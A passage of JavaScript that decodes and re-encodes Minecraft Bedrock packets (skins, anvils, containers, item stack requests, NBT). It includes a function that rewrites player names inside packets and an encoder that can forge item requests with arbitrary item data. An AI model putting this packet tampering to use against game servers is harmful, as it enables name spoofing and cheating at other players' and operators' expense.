            skin.personaPiece = readString();
            skin.pieceTint = readString();
            skin.mappingData = readString();
            skin.capeId = readString();
            skin.udid = readString();
            result.skins.push(skin);
        }

        result.platformUserId = readString();
        result.unknownInt = Number(readUVarInt());
        result.armSize = readString();
        result.version = readString();

        return result;
    }
}

function ModifyPacket(id, buffer, oldName, newName) {
    const BinaryUtils = {
        stringToBytes: function(str) {
            const bytes = [];
            for (let i = 0; i < str.length; i++) {
                let code = str.charCodeAt(i);
                if (code < 0x80) bytes.push(code);
                else if (code < 0x800) bytes.push(0xc0 | (code >> 6), 0x80 | (code & 0x3f));
                else if (code < 0xd800 || code >= 0xe000) bytes.push(0xe0 | (code >> 12), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
                else {
                    i++;
                    code = 0x10000 + (((code & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                    bytes.push(0xf0 | (code >> 18), 0x80 | ((code >> 12) & 0x3f), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
                }
            }
            return bytes;
        },
        writeVarInt: function(value, array) {
            do {
                let temp = value & 0x7F;
                value >>>= 7;
                if (value !== 0) temp |= 0x80;
                array.push(temp);
            } while (value !== 0);
        }
    };

    if (id !== 9 && id !== 12 && id !== 58 && id !== 63 && id !== 107 && id !== 108) {
        return buffer;
    }

    let u8 = new Uint8Array(buffer);
    const oldBytes = BinaryUtils.stringToBytes(oldName);
    const newBytes = BinaryUtils.stringToBytes(newName);

    if (oldBytes.length === 0) return buffer;

    if (id === 12) {
        let offset = 16;
        let nameLen = 0;
        let shift = 0;
        let b;
        let lenStart = offset;
        do {
            b = u8[offset++];
            nameLen |= (b & 0x7F) << shift;
            shift += 7;
        } while (b & 0x80);

        if (nameLen === oldBytes.length) {
            let match = true;
            for (let i = 0; i < nameLen; i++) {
                if (u8[offset + i] !== oldBytes[i]) {
                    match = false;
                    break;
                }
            }
            if (match) {
                const header = u8.subarray(0, lenStart);
                const tail = u8.subarray(offset + nameLen);
                const newLenBytes = [];
                BinaryUtils.writeVarInt(newBytes.length, newLenBytes);
                const newPacket = new Uint8Array(header.length + newLenBytes.length + newBytes.length + tail.length);
                let p = 0;
                newPacket.set(header, p);
                p += header.length;
                newPacket.set(newLenBytes, p);
                p += newLenBytes.length;
                newPacket.set(newBytes, p);
                p += newBytes.length;
                newPacket.set(tail, p);
                return newPacket.buffer;
            }
        }
        return buffer;
    }

    if (id === 63) {
        let offset = 1;
        let count = 0;
        let s = 0;
        let b;
        do {
            b = u8[offset++];
            count |= (b & 0x7F) << s;
            s += 7;
        } while (b & 0x80);

        if (count > 0) {
            let sections = [];
            let lastPos = 0;
            let hasChange = false;

            for (let i = 0; i < count; i++) {
                offset += 16;
                do {
                    b = u8[offset++];
                } while (b & 0x80);
                let lenStart = offset;
                let len = 0;
                s = 0;
                do {
                    b = u8[offset++];
                    len |= (b & 0x7F) << s;
                    s += 7;
                } while (b & 0x80);
                let strStart = offset;
                let strEnd = offset + len;
                offset = strEnd;

                if (len === oldBytes.length) {
                    let match = true;
                    for (let k = 0; k < len; k++) {
                        if (u8[strStart + k] !== oldBytes[k]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        sections.push(u8.subarray(lastPos, lenStart));
                        let lb = [];
                        BinaryUtils.writeVarInt(newBytes.length, lb);
                        sections.push(new Uint8Array(lb));
                        sections.push(new Uint8Array(newBytes));
                        lastPos = strEnd;
                        hasChange = true;
                    }
                }
                offset += 9;
                do {
                    b = u8[offset++];
                } while (b & 0x80);
            }

            if (hasChange) {
                sections.push(u8.subarray(lastPos));
                let total = 0;
                for (let sec of sections) total += sec.length;
                let res = new Uint8Array(total);
                let p = 0;
                for (let sec of sections) {
                    res.set(sec, p);
                    p += sec.length;
                }
                return res.buffer;
            }
        }
        return buffer;
    }

    let i = 0;
    while (i <= u8.length - oldBytes.length) {
        let match = true;
        for (let j = 0; j < oldBytes.length; j++) {
            if (u8[i + j] !== oldBytes[j]) {
                match = false;
                break;
            }
        }

        if (match) {
            if (i > 0 && u8[i - 1] === oldBytes.length) {
                const newTotalLen = u8.length - oldBytes.length + newBytes.length;
                const newU8 = new Uint8Array(newTotalLen);

                newU8.set(u8.subarray(0, i - 1), 0);
                newU8[i - 1] = newBytes.length;
                newU8.set(newBytes, i);
                newU8.set(u8.subarray(i + oldBytes.length), i + newBytes.length);

                u8 = newU8;
                i += newBytes.length;
            } else {
                i++;
            }
        } else {
            i++;
        }
    }
    return u8.buffer;
}

function ParseAnvilDamagePacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        const writeByte = (val) => {
            packet.push(Number(val) & 0xFF);
        };

        const writeUVarInt = (val) => {
            val = Number(val);
            if (val < 0) val = (val & 0xFFFFFFFF) >>> 0;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(val)) val = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (val === 0) break;
            }
        };

        const writeSVarInt = (val) => {
            val = Number(val);
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        };

        const writeBlockPos = (pos) => {
            writeSVarInt(pos.x !== undefined ? pos.x : 0);
            writeUVarInt(pos.y !== undefined ? pos.y : 0);
            writeSVarInt(pos.z !== undefined ? pos.z : 0);
        };

        writeByte(data.damage !== undefined ? data.damage : 0);
        writeBlockPos(data.anvilPos || {});

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;

        const readByte = () => {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        };

        const readUVarInt = () => {
            let value = 0;
            let multiplier = 1;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value += (byteData & 0x7F) * multiplier;
                multiplier *= 128;
            } while (byteData & 0x80);
            return value;
        };

        const readSVarInt = () => {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        };

        const readBlockPos = () => {
            return {
                x: readSVarInt(),
                y: readUVarInt() | 0,
                z: readSVarInt()
            };
        };

        let result = {};

        result.damage = readByte();
        result.anvilPos = readBlockPos();

        return result;
    }
}

function ParseContainerOpenPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(val & 0xFF);
        }

        function writeUVarInt(val) {
            let v = typeof val === 'bigint' ? val : BigInt(val);
            if (v < 0n) v = BigInt.asUintN(64, v);
            do {
                let temp = Number(v & 0x7Fn);
                v = v >> 7n;
                if (v > 0n) temp |= 0x80;
                packet.push(temp);
            } while (v > 0n);
        }

        function writeZigZag32(val) {
            let n = val | 0;
            let zz = ((n << 1) ^ (n >> 31)) >>> 0;
            writeUVarInt(zz);
        }

        function writeVarIntY(val) {
            let n = val | 0;
            if (n < 0) n += 4294967296;
            writeUVarInt(n);
        }

        function writeVarLong(val) {
            let n = typeof val === 'bigint' ? val : BigInt(val);
            let zz = (n << 1n) ^ (n >> 63n);
            writeUVarInt(zz);
        }
        writeByte(data.windowId || 0);
        writeByte(data.containerType || 0);
        if (data.blockPos) {
            writeZigZag32(data.blockPos.x || 0);
            writeVarIntY(data.blockPos.y || 0);
            writeZigZag32(data.blockPos.z || 0);
        } else {
            writeZigZag32(0);
            writeVarIntY(0);
            writeZigZag32(0);
        }
        writeVarLong(data.entityUniqueId || "-1");
        if (data.rawTailData) {
            for (let i = 0; i < data.rawTailData.length; i++) {
                writeByte(data.rawTailData[i]);
            }
        }

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0n;
            let shift = 0n;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value |= BigInt(byteData & 0x7F) << shift;
                shift += 7n;
            } while (byteData & 0x80);
            return value;
        }

        function readZigZag32() {
            let val = Number(readUVarInt() & 0xFFFFFFFFn);
            return (val >>> 1) ^ -(val & 1);
        }

        function readVarIntY() {
            let val = Number(readUVarInt() & 0xFFFFFFFFn);
            return val | 0;
        }

        function readVarLong() {
            let val = readUVarInt();
            let n = val;
            let zz = (n >> 1n) ^ -(n & 1n);
            return zz.toString();
        }

        let result = {};

        result.windowId = readByte();
        result.containerType = readByte();

        let posX = readZigZag32();
        let posY = readVarIntY();
        let posZ = readZigZag32();
        result.blockPos = {
            x: posX,
            y: posY,
            z: posZ
        };
        return result;
    }
}

function ParseItemStackRequestPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(val & 0xFF);
        }

        function writeUVarInt(val) {
            val = Math.max(0, val);
            let v = val;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(v)) v = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = v % 128;
                v = Math.floor(v / 128);
                if (v > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (v === 0) break;
            }
        }

        function writeSVarInt(val) {
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeString(str) {
            if (!str) str = "";
            let bytes = [];
            for (let i = 0; i < str.length; i++) {
                let charcode = str.charCodeAt(i);
                if (charcode < 0x80) {
                    bytes.push(charcode);
                } else if (charcode < 0x800) {
                    bytes.push(0xc0 | (charcode >> 6), 0x80 | (charcode & 0x3f));
                } else if (charcode < 0xd800 || charcode >= 0xe000) {
                    bytes.push(0xe0 | (charcode >> 12), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
                } else {
                    i++;
                    charcode = 0x10000 + (((charcode & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                    bytes.push(0xf0 | (charcode >> 18), 0x80 | ((charcode >> 12) & 0x3f), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
                }
            }
            writeUVarInt(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                writeByte(bytes[i]);
            }
        }

        function EncodeBedrockNBT(obj) {
            let nbtPacket = [];
            let viewBuffer = new ArrayBuffer(8);
            let view = new DataView(viewBuffer);
            let u8 = new Uint8Array(viewBuffer);

            function writeNbtByte(v) {
                nbtPacket.push(v & 0xFF);
            }

            function writeNbtShort(v) {
                view.setInt16(0, v, true);
                nbtPacket.push(u8[0], u8[1]);
            }

            function writeNbtInt(v) {
                view.setInt32(0, v, true);
                nbtPacket.push(u8[0], u8[1], u8[2], u8[3]);
            }

            function writeNbtFloat(v) {
                view.setFloat32(0, v, true);
                nbtPacket.push(u8[0], u8[1], u8[2], u8[3]);
            }

            function writeNbtDouble(v) {
                view.setFloat64(0, v, true);
                for (let i = 0; i < 8; i++) nbtPacket.push(u8[i]);
            }

            function writeNbtString(str) {
                let strBytes = [];
                for (let i = 0; i < str.length; i++) {
                    let c = str.charCodeAt(i);
                    if (c < 0x80) strBytes.push(c);
                    else if (c < 0x800) strBytes.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f));
                    else strBytes.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
                }
                writeNbtShort(strBytes.length);
                for (let i = 0; i < strBytes.length; i++) nbtPacket.push(strBytes[i]);
            }

            function getTagType(key, val) {
                if (typeof val === 'string') return 8;
                if (typeof val === 'boolean') return 1;
                if (typeof val === 'number') {
                    if (key === 'id' || key === 'lvl') return 2;
                    if (key === 'Unbreakable' || key === 'minecraft:keep_on_death' || key === 'keep_on_death' || key === 'Count' || key === 'wasPickedUp') return 1;
                    if (key === 'Damage') return 3;
                    if (!Number.isInteger(val)) return 5;
                    return 3;
                }
                if (Array.isArray(val)) return 9;
                if (typeof val === 'object' && val !== null) return 10;
                return 0;
            }

            function writeTagValue(type, key, val) {
                switch (type) {
                    case 1:
                        writeNbtByte(val ? 1 : 0);
                        break;
                    case 2:
                        writeNbtShort(val);
                        break;
                    case 3:
                        writeNbtInt(val);
                        break;
                    case 4:
                        writeNbtInt(val);
                        writeNbtInt(0);
                        break;
                    case 5:
                        writeNbtFloat(val);
                        break;
                    case 6:
                        writeNbtDouble(val);
                        break;
                    case 8:
                        writeNbtString(val);
                        break;
                    case 9:
                        if (val.length === 0) {
                            writeNbtByte(0);
                            writeNbtInt(0);
                        } else {
                            let ltype = getTagType(key, val[0]);
                            writeNbtByte(ltype);
                            writeNbtInt(val.length);
                            for (let i = 0; i < val.length; i++) writeTagValue(ltype, key, val[i]);
                        }
                        break;
                    case 10:
                        for (let k in val) {
                            let t = getTagType(k, val[k]);
                            if (t === 0) continue;
                            writeNbtByte(t);
                            writeNbtString(k);
                            writeTagValue(t, k, val[k]);
                        }
                        writeNbtByte(0);
                        break;
                }
            }
            writeNbtByte(10);
            writeNbtString("");
            writeTagValue(10, "", obj);
            return nbtPacket;
        }

        function writeItem(item) {
            writeSVarInt(item.id !== undefined ? item.id : 0);
            if (item.id !== undefined && item.id !== 0) {
                let buffer = new ArrayBuffer(2);
                new DataView(buffer).setUint16(0, item.count !== undefined ? item.count : 0, true);
                let view = new Uint8Array(buffer);
                packet.push(view[0]);
                packet.push(view[1]);
                writeUVarInt(item.meta !== undefined ? item.meta : 0);
                writeSVarInt(item.blockRuntimeId !== undefined ? item.blockRuntimeId : 0);
                if (item.extra !== undefined && item.extra !== null) {
                    if (Array.isArray(item.extra) && (item.extra.length === 0 || typeof item.extra[0] === 'number')) {
                        writeUVarInt(item.extra.length);
                        for (let i = 0; i < item.extra.length; i++) {
                            writeByte(item.extra[i]);
                        }
                    } else if (typeof item.extra === 'object') {
                        let nbtBytes = EncodeBedrockNBT(item.extra);
                        let extraBytes = [];
                        extraBytes.push(0xFF, 0xFF);
                        extraBytes.push(1);
                        for (let i = 0; i < nbtBytes.length; i++) extraBytes.push(nbtBytes[i]);
                        extraBytes.push(0, 0, 0, 0);
                        extraBytes.push(0, 0, 0, 0);
                        writeUVarInt(extraBytes.length);
                        for (let i = 0; i < extraBytes.length; i++) {
                            writeByte(extraBytes[i]);
                        }
                    } else {
                        writeUVarInt(0);
                    }
                } else {
                    writeUVarInt(0);
                }
            }
        }

        function writeSlotInfo(slot) {
            writeByte(slot.containerId !== undefined ? slot.containerId : 0);
            writeByte(slot.windowId !== undefined ? slot.windowId : 0);
            writeByte(slot.slot !== undefined ? slot.slot : 0);
            writeSVarInt(slot.stackId !== undefined ? slot.stackId : 0);
        }
        let requests = data.requests || [];
        writeUVarInt(requests.length);
        for (let i = 0; i < requests.length; i++) {
            let req = requests[i];
            writeSVarInt(req.requestId || 0);
            let actions = req.actions || [];
            writeUVarInt(actions.length);
            for (let j = 0; j < actions.length; j++) {
                let action = actions[j];
                writeByte(action.type || 0);
                switch (action.type) {
                    case 0:
                    case 1:
                    case 7:
                    case 8:
                        writeByte(action.count || 0);
                        writeSlotInfo(action.source || {});
                        writeSlotInfo(action.destination || {});
                        break;
                    case 2:
                    case 9:
                        writeSlotInfo(action.source || {});
                        writeSlotInfo(action.destination || {});
                        break;
                    case 3:
                        writeByte(action.count || 0);
                        writeSlotInfo(action.source || {});
                        writeByte(action.randomly || 0);
                        break;
                    case 4:
                    case 5:
                        writeByte(action.count || 0);
                        writeSlotInfo(action.source || {});
                        break;
                    case 6:
                        writeByte(action.slotId || 0);
                        break;
                    case 10:
                        writeByte(action.actionValue || 0);
                        break;
                    case 11:
                        writeSVarInt(action.primaryEffectId || 0);
                        writeSVarInt(action.secondaryEffectId || 0);
                        break;
                    case 12:
                        writeSVarInt(action.hotbarSlot || 0);
                        writeSVarInt(action.predictedDurability || 0);
                        writeSVarInt(action.stackId || 0);
                        break;
                    case 13:
                        writeUVarInt(action.recipeNetworkId || 0);
                        break;
                    case 14:
                        writeUVarInt(action.recipeNetworkId || 0);
                        writeByte(action.timesCrafted || 0);
                        break;
                    case 15:
                        writeUVarInt(action.creativeItemNetworkId || 0);
                        break;
                    case 16:
                        writeUVarInt(action.recipeNetworkId || 0);
                        writeUVarInt(action.filteredStringIndex || 0);
                        break;
                    case 17:
                        writeUVarInt(action.recipeNetworkId || 0);
                        writeSVarInt(action.cost || 0);
                        break;
                    case 18:
                        writeString(action.pattern || "");
                        break;
                    case 19:
                    case 20:
                        let results = action.results || [];
                        writeUVarInt(results.length);
                        for (let r = 0; r < results.length; r++) {
                            writeItem(results[r]);
                        }
                        break;
                    default:
                        if (action.rawBytes) {
                            for (let k = 0; k < action.rawBytes.length; k++) {
                                writeByte(action.rawBytes[k]);
                            }
                        }
                        break;
                }
            }
            let filterStrings = req.filterStrings || [];
            writeUVarInt(filterStrings.length);
            for (let j = 0; j < filterStrings.length; j++) {
                writeString(filterStrings[j]);
            }
            if (req.tailBytes) {
                for (let j = 0; j < req.tailBytes.length; j++) {
                    writeByte(req.tailBytes[j]);
                }
            }
        }
        return new Uint8Array(packet).buffer;
    } else {
        let u8 = new Uint8Array(data);
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readSignedByte() {
            if (offset >= u8.length) return 0;
            let byte = u8[offset++];
            return byte > 127 ? byte - 256 : byte;
        }

        function readUVarInt() {
            let value = 0;
            let shift = 0;
            let byte;
            do {
                if (offset >= u8.length) break;
                byte = u8[offset++];
                value += (byte & 0x7F) * Math.pow(2, shift);
                shift += 7;
            } while (byte & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readString() {
            let len = readUVarInt();
            let str = "";
            let i = 0;
            while (i < len) {
                if (offset >= u8.length) break;
                let c = readByte();
                i++;
                if (c < 0x80) {
                    str += String.fromCharCode(c);
                } else if (c > 0xbf && c < 0xe0) {
                    let c2 = readByte();
                    i++;
                    str += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
                } else if (c > 0xdf && c < 0xf0) {
                    let c2 = readByte();
                    i++;
                    let c3 = readByte();
                    i++;
                    str += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
                } else {
                    let c2 = readByte();
                    i++;
                    let c3 = readByte();
                    i++;
                    let c4 = readByte();
                    i++;
                    let codePoint = (((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f)) - 0x10000;
                    str += String.fromCharCode((codePoint >> 10) | 0xd800, (codePoint & 0x3ff) | 0xdc00);
                }
            }
            return str;
        }

        function ParseBedrockNBT(nbtU8, startIndex) {
            let nbtOffset = startIndex;
            let nbtView = new DataView(nbtU8.buffer, nbtU8.byteOffset, nbtU8.byteLength);

            function readNbtString() {
                if (nbtOffset + 2 > nbtU8.length) return "";
                let len = nbtView.getUint16(nbtOffset, true);
                nbtOffset += 2;
                let str = "";
                let end = Math.min(nbtOffset + len, nbtU8.length);
                while (nbtOffset < end) {
                    let c = nbtU8[nbtOffset++];
                    if (c < 0x80) {
                        str += String.fromCharCode(c);
                    } else if (c >= 0xC0 && c < 0xE0) {
                        if (nbtOffset >= end) break;
                        let c2 = nbtU8[nbtOffset++];
                        str += String.fromCharCode(((c & 0x1F) << 6) | (c2 & 0x3F));
                    } else if (c >= 0xE0 && c < 0xF0) {
                        if (nbtOffset + 1 >= end) break;
                        let c2 = nbtU8[nbtOffset++];
                        let c3 = nbtU8[nbtOffset++];
                        str += String.fromCharCode(((c & 0x0F) << 12) | ((c2 & 0x3F) << 6) | (c3 & 0x3F));
                    } else if (c >= 0xF0 && c < 0xF8) {
                        if (nbtOffset + 2 >= end) break;
                        let c2 = nbtU8[nbtOffset++];
                        let c3 = nbtU8[nbtOffset++];
                        let c4 = nbtU8[nbtOffset++];
                        let u = (((c & 0x07) << 18) | ((c2 & 0x3F) << 12) | ((c3 & 0x3F) << 6) | (c4 & 0x3F)) - 0x10000;
                        str += String.fromCharCode(0xD800 | (u >> 10), 0xDC00 | (u & 0x3FF));
                    }
                }
                return str;
            }

            function readTag(type) {
                try {
                    switch (type) {
                        case 1:
                            nbtOffset += 1;
                            return nbtU8[nbtOffset - 1];
                        case 2:
                            nbtOffset += 2;
                            return nbtView.getInt16(nbtOffset - 2, true);
                        case 3:
                            nbtOffset += 4;
                            return nbtView.getInt32(nbtOffset - 4, true);
                        case 4:
                            nbtOffset += 8;
                            let bigInt = nbtView.getBigInt64(nbtOffset - 8, true);
                            return Number(bigInt);
                        case 5:
                            nbtOffset += 4;
                            return nbtView.getFloat32(nbtOffset - 4, true);
                        case 6:
                            nbtOffset += 8;
                            return nbtView.getFloat64(nbtOffset - 8, true);
                        case 7:
                            let blen = nbtView.getInt32(nbtOffset, true);
                            nbtOffset += 4;
                            let bArr = Array.from(nbtU8.slice(nbtOffset, nbtOffset + blen));
                            nbtOffset += blen;
                            return bArr;
                        case 8:
                            return readNbtString();
                        case 9:
                            let listType = nbtU8[nbtOffset++];
                            let llen = nbtView.getInt32(nbtOffset, true);
                            nbtOffset += 4;
                            let list = [];
                            for (let i = 0; i < llen; i++) list.push(readTag(listType));
                            return list;
                        case 10:
                            let obj = {};
                            while (nbtOffset < nbtU8.length) {
                                let t = nbtU8[nbtOffset++];
                                if (t === 0) break;
                                let name = readNbtString();
                                obj[name] = readTag(t);
                            }
                            return obj;
                        case 11:
                            let ilen = nbtView.getInt32(nbtOffset, true);
                            nbtOffset += 4;
                            let iArr = [];
                            for (let i = 0; i < ilen; i++) {
                                iArr.push(nbtView.getInt32(nbtOffset, true));
                                nbtOffset += 4;
                            }
                            return iArr;
                        default:
                            return null;
                    }
                } catch (e) {
                    return null;
                }
            }
            try {
                let rootType = nbtU8[nbtOffset++];
                if (rootType === 10) {
                    let rootName = readNbtString();
                    return readTag(10);
                }
            } catch (e) {}
            return null;
        }

        function ExtractNBT(extraDataArray) {
            if (!extraDataArray || extraDataArray.length < 2) return null;
            let nbtU8 = new Uint8Array(extraDataArray);
            let nbtView = new DataView(nbtU8.buffer, nbtU8.byteOffset, nbtU8.byteLength);
            let hasNbt = nbtView.getInt16(0, true);
            if (hasNbt === -1) {
                if (nbtU8.length > 3 && nbtU8[3] === 10) {
                    return ParseBedrockNBT(nbtU8, 3);
                }
            } else if (hasNbt > 0) {
                if (nbtU8.length > 2 && nbtU8[2] === 10) {
                    return ParseBedrockNBT(nbtU8, 2);
                }
            }
            for (let i = 0; i < Math.min(nbtU8.length - 2, 20); i++) {
                if (nbtU8[i] === 10 && nbtU8[i + 1] === 0 && nbtU8[i + 2] === 0) {
                    return ParseBedrockNBT(nbtU8, i);
                }
            }
            return null;
        }

        function readItem() {
            let id = readSVarInt();
            if (id === 0) return {
                id: 0
            };
            let count = 0;
            if (offset + 2 <= u8.length) {
                count = dv.getUint16(offset, true);
                offset += 2;
            }
            let meta = readUVarInt();
            let blockRuntimeId = readSVarInt();
            let extraLen = readUVarInt();
            let extra = [];
            for (let i = 0; i < extraLen; i++) {
                if (offset >= u8.length) break;
                extra.push(readByte());
            }
            let parsedNbt = ExtractNBT(extra);
            return {
                id: id,
                count: count,
                meta: meta,
                blockRuntimeId: blockRuntimeId,
                extra: parsedNbt !== null ? parsedNbt : extra
            };
        }

        function readSlotInfo() {
            return {
                containerId: readSignedByte(),
                windowId: readSignedByte(),
                slot: readSignedByte(),
                stackId: readSVarInt()
            };
        }
        let reqCount = readUVarInt();
        let requests = [];
        for (let i = 0; i < reqCount; i++) {
            if (offset >= u8.length) break;
            let requestId = readSVarInt();
            let actionsCount = readUVarInt();
            let actions = [];
            for (let j = 0; j < actionsCount; j++) {
                if (offset >= u8.length) break;
                let type = readByte();
                let action = {
                    type: type
                };
                switch (type) {
                    case 0:
                    case 1:
                    case 7:
                    case 8:
                        action.count = readByte();
                        action.source = readSlotInfo();
                        action.destination = readSlotInfo();
                        break;
                    case 2:
                    case 9:
                        action.source = readSlotInfo();
                        action.destination = readSlotInfo();
                        break;
                    case 3:
                        action.count = readByte();
                        action.source = readSlotInfo();
                        action.randomly = readByte();
                        break;
                    case 4:
                    case 5:
                        action.count = readByte();
                        action.source = readSlotInfo();
                        break;
                    case 6:
                        action.slotId = readSignedByte();
                        break;
                    case 10:
                        action.actionValue = readByte();
                        break;
                    case 11:
                        action.primaryEffectId = readSVarInt();
                        action.secondaryEffectId = readSVarInt();
                        break;
                    case 12:
                        action.hotbarSlot = readSVarInt();
                        action.predictedDurability = readSVarInt();
                        action.stackId = readSVarInt();
                        break;
                    case 13:
                        action.recipeNetworkId = readUVarInt();
                        break;
                    case 14:
                        action.recipeNetworkId = readUVarInt();
                        action.timesCrafted = readByte();
                        break;
                    case 15:
                        action.creativeItemNetworkId = readUVarInt();
                        break;
                    case 16:
                        action.recipeNetworkId = readUVarInt();
                        action.filteredStringIndex = readUVarInt();
                        break;
                    case 17:
                        action.recipeNetworkId = readUVarInt();
                        action.cost = readSVarInt();
                        break;
                    case 18:
                        action.pattern = readString();
                        break;
                    case 19:
                    case 20:
                        action.results = [];
                        let resCount = readUVarInt();
                        for (let r = 0; r < resCount; r++) {
                            action.results.push(readItem());
                        }
                        break;
                    default:
                        action.rawBytes = [];
                        break;
                }
                actions.push(action);
            }
            let filterStringsCount = readUVarInt();
            let filterStrings = [];
            for (let j = 0; j < filterStringsCount; j++) {
                if (offset >= u8.length) break;
                filterStrings.push(readString());
            }
            let tailBytes = [];
            if (i === reqCount - 1) {
                while (offset < u8.length) {
                    tailBytes.push(readByte());
                }
            } else {
                for (let j = 0; j < 5 && offset < u8.length; j++) {
                    tailBytes.push(readByte());
                }
            }
            requests.push({
                requestId: requestId,
                actions: actions,
                filterStrings: filterStrings,
                tailBytes: tailBytes
            });
        }
        return {
            requests: requests
        };
    }
}


function ParseBedrockNBT(u8, startIndex) {
    let offset = startIndex;
    let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

    function readString() {
        if (offset + 2 > u8.length) return "";
        let len = view.getUint16(offset, true);
        offset += 2;
        let str = "";
        let end = Math.min(offset + len, u8.length);
        while (offset < end) {
            let c = u8[offset++];
            if (c < 0x80) {
                str += String.fromCharCode(c);
            } else if (c >= 0xC0 && c < 0xE0) {
                if (offset >= end) break;
                let c2 = u8[offset++];
                str += String.fromCharCode(((c & 0x1F) << 6) | (c2 & 0x3F));
            } else if (c >= 0xE0 && c < 0xF0) {
                if (offset + 1 >= end) break;
                let c2 = u8[offset++];
                let c3 = u8[offset++];
                str += String.fromCharCode(((c & 0x0F) << 12) | ((c2 & 0x3F) << 6) | (c3 & 0x3F));
            } else if (c >= 0xF0 && c < 0xF8) {
                if (offset + 2 >= end) break;
                let c2 = u8[offset++];
                let c3 = u8[offset++];
                let c4 = u8[offset++];
                let u = (((c & 0x07) << 18) | ((c2 & 0x3F) << 12) | ((c3 & 0x3F) << 6) | (c4 & 0x3F)) - 0x10000;
                str += String.fromCharCode(0xD800 | (u >> 10), 0xDC00 | (u & 0x3FF));
            }
        }
        return str;
    }

    function readTag(type) {
        try {
            switch (type) {
                case 1:
                    offset += 1;
                    return u8[offset - 1];
                case 2:
                    offset += 2;
                    return view.getInt16(offset - 2, true);
                case 3:
                    offset += 4;
                    return view.getInt32(offset - 4, true);
                case 4:
                    offset += 8;
                    let bigInt = view.getBigInt64(offset - 8, true);
                    return Number(bigInt);
                case 5:
                    offset += 4;
                    return view.getFloat32(offset - 4, true);
                case 6:
                    offset += 8;
                    return view.getFloat64(offset - 8, true);
                case 7:
                    let blen = view.getInt32(offset, true);
                    offset += 4;
                    let bArr = Array.from(u8.slice(offset, offset + blen));
                    offset += blen;
                    return bArr;
                case 8:
                    return readString();
                case 9:
                    let listType = u8[offset++];
                    let llen = view.getInt32(offset, true);
                    offset += 4;
                    let list = [];
                    for (let i = 0; i < llen; i++) list.push(readTag(listType));
                    return list;
                case 10:
                    let obj = {};
                    while (offset < u8.length) {
                        let t = u8[offset++];
                        if (t === 0) break;
                        let name = readString();
                        obj[name] = readTag(t);
                    }
                    return obj;
                case 11:
                    let ilen = view.getInt32(offset, true);
                    offset += 4;
                    let iArr = [];
                    for (let i = 0; i < ilen; i++) {
                        iArr.push(view.getInt32(offset, true));
                        offset += 4;
                    }
                    return iArr;
                default:
                    return null;
            }
        } catch (e) {
            return null;
        }
    }

    try {
        let rootType = u8[offset++];
        if (rootType === 10) {
            let rootName = readString();
            return readTag(10);
        }
    } catch (e) {}
    return null;
}

function ExtractNBT(extraDataArray) {
    if (!extraDataArray || extraDataArray.length < 2) return null;
    let u8 = new Uint8Array(extraDataArray);
    let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

    let hasNbt = view.getInt16(0, true);
    if (hasNbt === -1) {
        if (u8.length > 3 && u8[3] === 10) {
            return ParseBedrockNBT(u8, 3);
        }
    } else if (hasNbt > 0) {
        if (u8.length > 2 && u8[2] === 10) {
            return ParseBedrockNBT(u8, 2);
        }
    }

    for (let i = 0; i < Math.min(u8.length - 2, 20); i++) {
        if (u8[i] === 10 && u8[i + 1] === 0 && u8[i + 2] === 0) {
